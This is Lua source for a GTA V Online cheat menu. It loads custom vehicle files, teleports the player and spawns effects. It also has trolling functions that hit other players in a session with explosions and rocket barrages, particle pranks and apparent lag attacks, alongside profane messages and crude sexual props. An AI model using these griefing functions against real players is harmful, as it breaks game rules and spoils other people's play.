    if vehicle ~= initial_vehicle then
        if data.data ~= nil then 
            -- for the updated edition
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.data.visible, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.data.godmode)
        else
            if sd.godmode ~= nil then
                ENTITY.SET_ENTITY_INVINCIBLE(vehicle, sd.godmode)
            end
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    else
        if data.godmode ~= nil then
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, data.godmode)
        end
        if data.visible ~= nil then
            ENTITY.SET_ENTITY_VISIBLE(vehicle, data.visible, 0)
        end
    end

    if vehicle ~= initial_vehicle then 
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle, initial_vehicle, 0, data.offset.x, data.offset.y, data.offset.z, data.rotation.x, data.rotation.y, data.rotation.z, true, false, true, false, 2, true)
    end

    -- for some reason jackz used the name of the mod instead of the mod index / mod type lol
    -- otherwise, this code couldve taken up just 3 lines
    -- not like i couldnt have used a table, but still, come on...
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, sd['Tire Smoke'].r, sd['Tire Smoke'].g, sd['Tire Smoke'].b)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 0, mods['Spoilers'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 1, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 2, mods['Front Bumper'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 3, mods['Side Skirt'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 4, mods['Exhaust'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 5, mods['Frame'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 6, mods['Grille'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 7, mods['Hood'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 8, mods['Fender'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 9, mods['Right Fender'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 10, mods['Roof'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 11, mods['Engine'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 12, mods['Brakes'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 13, mods['Transmission'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 14, mods['Horns'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 15, mods['Suspension'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 16, mods['Armor'], false)
    -- no front wheels in spec? lol?
    --VEHICLE.SET_VEHICLE_MOD(vehicle, 23, mods['Front Wheels'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 24, mods["Motorcycle Back Wheel Design"], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 25, mods['Plate Holders'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 27, mods['Trim Design'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 28, mods['Ornaments'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 30, mods['Dial Design'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 33, mods['Steering Wheel'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 34, mods['Shifter Leavers'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 35, mods['Plaques'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 36, mods['Hydraulics'], false)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 48, mods['Livery'], false)

    -- toggle 
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 17, mods.Toggles.UNK17)
    -- typo here in the jackz json spec btw, not my fault :|
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, mods.Toggles['Turbo Turning'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 19, mods.Toggles['UNK19'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, mods.Toggles['Tire Smoke'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 21, mods.Toggles['UNK21'])
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, mods.Toggles['Xenon Headlights'])
    -------
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, not sd['Bulletproof Tires'])
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, sd['Dirt Level'])
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, sd['Window Tint'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, sd['Dashboard Color'])
    for i=10, 11 do 
        VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, not sd.Extras[i])
    end
    -- lights
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, sd['Interior Color'])
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 0, sd.Lights.Neon.Left)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 1, sd.Lights.Neon.Right)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 2, sd.Lights.Neon.Front)
    VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, 3, sd.Lights.Neon.back)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, sd.Lights.Neon.Color.r, sd.Lights.Neon.Color.g, sd.Lights.Neon.Color.b) 
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle, sd.Lights['Xenon Color'])
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, sd['Engine Running'], true, false) 
    -- colors 
    local colors = sd.Colors
    -- why is there a custom rgb color in the "vehicle" colors but also in both primary and secondary fields? what is the point?
    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors.Vehicle.Primary, colors.Vehicle.Secondary)
    if colors.Primary.Custom then 
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colors.Primary['Custom Color'].r, colors.Primary['Custom Color'].g, colors.Primary['Custom Color'].b)
    end
    if colors.Secondary.Custom then 
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colors.Secondary['Custom Color'].r, colors.Secondary['Custom Color'].g, colors.Secondary['Custom Color'].b)
    end
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors.Extras.pearlescent, colors.Extras.wheel)
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, colors['Paint Fade'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
end

local supported_jackz_versions = {'1.1.0', '1.3.0', '1.3.1', '1.4.0'}
function json_load_vehicle(path)
    local all_entities = {}
    local success = false
    local fp = io.open(path, "r")
    if not fp then 
        util.toast("打开错误了 他妈的 " .. path)
        return
    end
    local json_string = fp:read("*all")
    local json_tbl = lunajson.decode(json_string)
    if json_tbl.version ~= nil then 
        local disp_version = string.gsub(json_tbl.version, 'Jackz自定义载具 ', '')
        if not table.contains(supported_jackz_versions, disp_version) then 
            util.toast("兰斯Spooner不支持这个Jackz或JSON版本 (版本 " .. disp_version .. "). 正在加载此文件，有可能正常使用.如果此模组显示正常，请告诉我，已便我可以减少这类提示!")
        end
    else
        util.toast("这辆Jackz载具多久了你他妈还在用(或者这他妈就不是Jackz载具). 在尝试了 可能会失败哦.")
    end
    local base = json_tbl.base
    if base.model == nil then 
        util.toast(fail_text)
        return
    end
    local v_hash = base.model
    request_model_load(v_hash)
    local c = players.get_position(players.user())
    local initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
    all_entities[#all_entities + 1] = initial_vehicle
    json_preprocess_vehicle(initial_vehicle, base, initial_vehicle)

    for k,o in pairs(json_tbl.objects) do 
        request_model_load(o.model)
        local this_obj = entities.create_object(o.model, c)
        all_entities[#all_entities + 1] = this_obj
        ENTITY.SET_ENTITY_VISIBLE(this_obj, o.visible, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(this_obj, initial_vehicle, 0, o.offset.x, o.offset.y, o.offset.z, o.rotation.x, o.rotation.y, o.rotation.z, true, false, true, false, 2, true)
    end

    if json_tbl.vehicles ~= nil then 
        for k,veh in pairs(json_tbl.vehicles) do 
            local v_hash = veh.model
            request_model_load(v_hash)
            local this_veh = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            all_entities[#all_entities + 1] = this_veh
            json_preprocess_vehicle(this_veh, veh, initial_vehicle)
        end
    end

    success = true 
    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir, ''), {"lancespoonerv" .. initial_vehicle}, "")
        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)

        menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)

        menu.action(this_veh_root, "传送至载具内", {"teleportejsonv" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)

    else
        util.toast("发生了他妈的错误!这个JSON不能加载.滚 :'(")
    end
end

--拓展选项
CCAM = 0
STP_SPEED_MODIFIER = 0.02
STP_COORD_HEIGHT = 300

FRAME_STP = false

--preload
DR_TXT_SCALE = 0.5

--preload
EP_drawveh = true
EP_drawped = true
EP_drawobj = true
EP_drawpick = true
----
EPS_vehx = 0.0
EPS_vehy = 0.03
--
EPS_pedx = 0.0
EPS_pedy = 0.05
--
EPS_objx = 0.0
EPS_objy = 0.07
--
EPS_pickx = 0.0
EPS_picky = 0.09
--

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

function onStartup()
    SE_LocalPed = GetLocalPed()
end

onStartup()

local c1
local c2
local c3
local c4
local c5
local c6
local c7
local c8
local c9
local c10
local c12
local c13
local c14
local c15
local c16
local c17
local c18
local c19

function aball()
    STREAMING.REQUEST_MODEL(bigasscircle)
    while not STREAMING.HAS_MODEL_LOADED(bigasscircle) do
        STREAMING.REQUEST_MODEL(bigasscircle)
        util.yield()
    end
    c1 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751)) --why tables when ctrl + c, ctrl + v
    c2 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c3 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c4 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c5 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c6 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c7 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c8 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c9 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c10 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c11 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c12 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c13 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c14 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c15 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c16 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c17 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c18 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    c19 = entities.create_object(bigasscircle, v3(-75.14637, -818.67236, 326.1751))
    ENTITY.FREEZE_ENTITY_POSITION(c1, true)
    ENTITY.FREEZE_ENTITY_POSITION(c2, true)
    ENTITY.FREEZE_ENTITY_POSITION(c3, true)
    ENTITY.FREEZE_ENTITY_POSITION(c4, true)
    ENTITY.FREEZE_ENTITY_POSITION(c5, true)
    ENTITY.FREEZE_ENTITY_POSITION(c6, true)
    ENTITY.FREEZE_ENTITY_POSITION(c7, true)
    ENTITY.FREEZE_ENTITY_POSITION(c8, true)
    ENTITY.FREEZE_ENTITY_POSITION(c9, true)
    ENTITY.FREEZE_ENTITY_POSITION(c10, true)
    ENTITY.FREEZE_ENTITY_POSITION(c11, true)
    ENTITY.FREEZE_ENTITY_POSITION(c12, true)
    ENTITY.FREEZE_ENTITY_POSITION(c13, true)
    ENTITY.FREEZE_ENTITY_POSITION(c14, true)
    ENTITY.FREEZE_ENTITY_POSITION(c15, true)
    ENTITY.FREEZE_ENTITY_POSITION(c16, true)
    ENTITY.FREEZE_ENTITY_POSITION(c17, true)
    ENTITY.FREEZE_ENTITY_POSITION(c18, true)
    ENTITY.FREEZE_ENTITY_POSITION(c19, true)
    ENTITY.SET_ENTITY_ROTATION(c2, 0.0, 0.0, 10.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c3, 0.0, 0.0, 20.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c4, 0.0, 0.0, 30.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c5, 0.0, 0.0, 40.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c6, 0.0, 0.0, 50.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c7, 0.0, 0.0, 60.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c8, 0.0, 0.0, 70.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c9, 0.0, 0.0, 80.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c10, 0.0, 0.0, 90.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c11, 0.0, 0.0, 100.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c12, 0.0, 0.0, 110.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c13, 0.0, 0.0, 120.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c14, 0.0, 0.0, 130.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c15, 0.0, 0.0, 140.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c16, 0.0, 0.0, 150.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c18, 0.0, 0.0, 160.0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(c19, 0.0, 0.0, 170.0, 1, true)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), -75.14637, -818.67236, 326.1751)
end

function shanqiu()
    entities.delete_by_handle(c1)
    entities.delete_by_handle(c2)
    entities.delete_by_handle(c3)
    entities.delete_by_handle(c4)
    entities.delete_by_handle(c5)
    entities.delete_by_handle(c6)
    entities.delete_by_handle(c7)
    entities.delete_by_handle(c8)
    entities.delete_by_handle(c9)
    entities.delete_by_handle(c10)
    entities.delete_by_handle(c11)
    entities.delete_by_handle(c12)
    entities.delete_by_handle(c13)
    entities.delete_by_handle(c14)
    entities.delete_by_handle(c15)
    entities.delete_by_handle(c16)
    entities.delete_by_handle(c17)
    entities.delete_by_handle(c18)
    entities.delete_by_handle(c19)
end


local function request_ptfx_asset_firework(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

local placed_firework_boxes = {}

function placefirework()
    local animlib = 'anim@mp_fireworks'
    local ptfx_asset = "scr_indep_fireworks"
    local anim_name = 'place_firework_3_box'
    local effect_name = "scr_indep_firework_trailburst"
    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 0.52, 0.0)
    local ped = players.user_ped()
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    util.yield(1500)
    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)
    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
    ENTITY.FREEZE_ENTITY_POSITION(ped, false)
    util.yield(1000)
    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)
    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box
end

function fireworkshow()
    if #placed_firework_boxes == 0 then 
        notification("先放烟花！", colors.blue)
        return 
    end
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    request_ptfx_asset_firework(ptfx_asset)
    notification("烟花!!!", colors.blue)
    for i=1, 50 do
        for k,box in pairs(placed_firework_boxes) do 
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 0.0, 0.0, 0.0)
            util.yield(100)
        end
    end
    for k,box in pairs(placed_firework_boxes) do 
        entities.delete_by_handle(box)
        placed_firework_boxes[box] = nil
    end
end


function autocover()
    local health = ENTITY.GET_ENTITY_HEALTH(players.user_ped())
    if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) == health then return end
    ENTITY.SET_ENTITY_HEALTH(players.user_ped(), health + 5, 0)
    util.yield(255)
end

function notifyhealth()
    local player_maxhealth = PED.GET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
    local player_currenthealth = ENTITY.GET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID())
    util.toast("当前血量：" .. player_currenthealth .. "\n最大血量：" .. player_maxhealth)
end

function notifyarmor()
    local player_currentarmour = PED.GET_PED_ARMOUR(PLAYER.PLAYER_PED_ID())
    local player_maxarmour = PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID())
    util.toast("当前护甲：" .. player_currentarmour .. "\n最大护甲：" .. player_maxarmour)
end

obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01"}
opt_pp = {"小鸡巴", "大鸡巴", "超级鸡巴", "删除"}

function getbigjb(index, value, click_type)
    pluto_switch index do
        case 1:
            attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
            break
        case 2:
            attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
            break
        case 3:
            attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
            break
        case 4:
            for k, model in pairs(obj_pp) do 
                delete_object(model)
            end
            break
        end
    end

    function teleport_place()
        local interiors = {
            {"安全空间 [挂机室]", {x=-158.71494, y=-982.75885, z=149.13135}},
            {"酷刑室", {x=147.170, y=-2201.804, z=4.688}},
            {"矿道", {x=-595.48505, y=2086.4502, z=131.38136}},
            {"欧米茄车库", {x=2330.2573, y=2572.3005, z=46.679367}},
            {"末日任务服务器组", {x=2155.077, y=2920.9417, z=-81.075455}},
            {"角色捏脸房间", {x=402.91586, y=-998.5701, z=-99.004074}},
            {"Lifeinvader大楼", {x=-1082.8595, y=-254.774, z=37.763317}},
            {"竞速结束车库", {x=405.9228, y=-954.1149, z=-99.6627}},
            {"被摧毁的医院", {x=304.03894, y=-590.3037, z=43.291893}},
            {"体育场", {x=-256.92334, y=-2024.9717, z=30.145584}},
            {"Split Sides喜剧俱乐部", {x=-430.00974, y=261.3437, z=83.00648}},
            {"巴哈马酒吧", {x=-1394.8816, y=-599.7526, z=30.319544}},
            {"看门人之家", {x=-110.20285, y=-8.6156025, z=70.51957}},
            {"费蓝德医生之家", {x=-1913.8342, y=-574.5799, z=11.435149}},
            {"杜根房子", {x=1395.2512, y=1141.6833, z=114.63437}},
            {"弗洛伊德公寓", {x=-1156.5099, y=-1519.0894, z=10.632717}},
            {"麦克家", {x=-813.8814, y=179.07889, z=72.15914}},
            {"富兰克林家（旧）", {x=-14.239959, y=-1439.6913, z=31.101551}},
            {"富兰克林家（新）", {x=7.3125067, y=537.3615, z=176.02803}},
            {"崔佛家", {x=1974.1617, y=3819.032, z=33.436287}},
            {"莱斯斯家", {x=1273.898, y=-1719.304, z=54.771}},
            {"莱斯特的纺织厂", {x=713.5684, y=-963.64795, z=30.39534}},
            {"莱斯特的纺织厂办事处", {x=707.2138, y=-965.5549, z=30.412853}},
            {"甲基安非他明实验室", {x=1391.773, y=3608.716, z=38.942}},
            {"人道实验室", {x=3625.743, y=3743.653, z=28.69009}},
            {"汽车旅馆客房", {x=152.2605, y=-1004.471, z=-99.024}},
            {"警察局", {x=443.4068, y=-983.256, z=30.689589}},
            {"太平洋标准银行金库", {x=263.39627, y=214.39891, z=101.68336}},
            {"布莱恩郡银行", {x=-109.77874, y=6464.8945, z=31.626724}},
            {"龙舌兰酒吧", {x=-564.4645, y=275.5777, z=83.074585}},
            {"废料厂车库", {x=485.46396, y=-1315.0614, z=29.2141}},
            {"失落摩托帮", {x=980.8098, y=-101.96038, z=74.84504}},
            {"范吉利科珠宝店", {x=-629.9367, y=-236.41296, z=38.057056}},
            {"机场休息室", {x=-913.8656, y=-2527.106, z=36.331566}},
            {"停尸房", {x=240.94368, y=-1379.0645, z=33.74177}},
            {"联盟保存处", {x=1.298771, y=-700.96967, z=16.131021}},
            {"军事基地瞭望塔", {x=-2357.9187, y=3249.689, z=101.45073}},
            {"事务所内部", {x=-1118.0181, y=-77.93254, z=-98.99977}},
            {"复仇者内部", {x=518.6444, y=4750.4644, z=-69.3235}},
            {"恐霸内部", {x=-1421.015, y=-3012.587, z=-80.000}},
            {"地堡内部", {x=899.5518,y=-3246.038, z=-98.04907}},
            {"IAA 办公室", {x=128.20, y=-617.39, z=206.04}},
            {"FIB 顶层", {x=135.94359, y=-749.4102, z=258.152}},
            {"FIB 47层", {x=134.5835, y=-766.486, z=234.152}},
            {"FIB 49层", {x=134.635, y=-765.831, z=242.152}},
            {"大公鸡", {x=-31.007448, y=6317.047, z=40.04039}},
            {"大麻商店", {x=-1170.3048, y=-1570.8246, z=4.663622}},
            {"脱衣舞俱乐部DJ位置", {x=121.398254, y=-1281.0024, z=29.480522}},
        }
        for index, data in pairs(interiors) do
            local location_name = data[1]
            local location_coords = data[2]
            menu.action(teleport, location_name, {}, "", function()
                menu.trigger_commands("doors on")
                menu.trigger_commands("nodeathbarriers on")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), location_coords.x, location_coords.y, location_coords.z, false, false, false)
            end)
        end
    end

    function ufffo()
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local r = num[math.random(#num)]
        c.x = math.random(0.0,1.0) >= 0.5 and c.x + r + 5 or c.x - r - 5 --set x coords
        c.y = math.random(0.0,1.0) >= 0.5 and c.y + r + 5 or c.y - r - 5 --set y coords
        c.z = c.z + r + 8 --set z coords
        STREAMING.REQUEST_MODEL(ufo)
        while not STREAMING.HAS_MODEL_LOADED(ufo) do
            STREAMING.REQUEST_MODEL(ufo)
            util.yield()
        end
        util.yield(2500)
        local spawnedufo = entities.create_object(ufo, c) --spawn ufo
        util.yield(500)
        local ufoc = ENTITY.GET_ENTITY_COORDS(spawnedufo) --get ufo pos
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(ufoc.x, ufoc.y) --get floor pos
            util.yield()
        until success
        FIRE.ADD_EXPLOSION(ufoc.x, ufoc.y, floorcoords, exp, 100.0, true, false, 1.0, false) --explode at floor
        util.yield(1500)
        entities.delete_by_handle(spawnedufo) --delete ufo
    
        if not STREAMING.HAS_MODEL_LOADED(ufo) then
            util.toast("无法加载模型")
        end
    end

function request_control(entity, timeOut)
    if not ENTITY.DOES_ENTITY_EXIST(entity) then
        return false
    end
    timeOut = timeOut or 500
    local start = newTimer()
    while not request_control_once(entity) and start.elapsed() < timeOut do
        util.yield_once()
    end
    return start.elapsed() < timeOut
end

function REQUEST_CONTROL(entity)
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function carjump()
    local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)
	for _, vehicle in ipairs(entities) do
		REQUEST_CONTROL(vehicle)
		ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)
	end
	wait(1500)
end

local irlTime = false
local setClockCommand = menu.ref_by_path('World>Atmosphere>Clock>Time', 37)
local smoothTransitionCommand = menu.ref_by_path('World>Atmosphere>Clock>Smooth Transition', 37)
function iri_time(toggle)
    irlTime = toggle
    if menu.get_value(smoothTransitionCommand) then menu.trigger_command(smoothTransitionCommand) end
    util.create_tick_handler(function()
        menu.trigger_command(setClockCommand, os.date('%H:%M:%S'))
        return irlTime
    end)
end

mapZoom = 83
function Zoom_map(value)
    mapZoom = 83
    mapZoom = value
    util.create_tick_handler(function()
        HUD.SET_RADAR_ZOOM_PRECISE(mapZoom)
        return mapZoom != 83
    end)
end

function disableNumpad()
    if not menu.is_open() or JSkey.is_key_down('VK_LBUTTON') or JSkey.is_key_down('VK_RBUTTON') then return end
    for _, control in pairs(numpadControls) do
        PAD.DISABLE_CONTROL_ACTION(2, control, true)
    end
end

function SE_add_explosion(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
    FIRE.ADD_EXPLOSION(x, y, z, exptype, dmgscale, isheard, isinvis, camshake, nodmg)
end

function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

function rain_rockets(pid, owned)
    local user_ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local owner
    local hash = util.joaat("weapon_airstrike_rocket")
    if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
        WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
    end
    pos.x = pos.x + math.random(-6,6)
    pos.y = pos.y + math.random(-6,6)
    local ground_ptr = memory.alloc(32); MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, ground_ptr, false, false); pos.z = memory.read_float(ground_ptr); memory.free(ground_ptr)
    if owned then owner = user_ped else owner = 0 end
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z+50, pos.x, pos.y, pos.z, 200, true, hash, owner, true, false, 2500.0)
end

function request_ptfx_asset_peeloop(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end

function peeloop_player(pid)
    if state then 
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
        request_ptfx_asset_peeloop("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false) 
    else
        GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)
    end
end

function piggy_back(pid, on)
    if players.user() == pid then return end
    usingPiggyback = on
    if usingPiggyback then
        usingRape = false
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
        while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
            util.yield_once()
        end
        local boneId = PED.GET_PED_BONE_INDEX(target, 0xDD1C)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(
            players.user_ped(),
            target,
            boneId,
            0.0, -0.2, 0.65,
            0.0, 0.0, 180.0,
            false, true, false, false, 0, true, 0)
        TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, -8.0, -1, 1, 0.0, false, false, false)

        while usingPiggyback and is_player_active(pid, false, true) and
        not util.is_session_transition_active() do
            util.yield_once()
        end
        usingPiggyback = false
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
    end
end

function smokelagg(pid) 
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
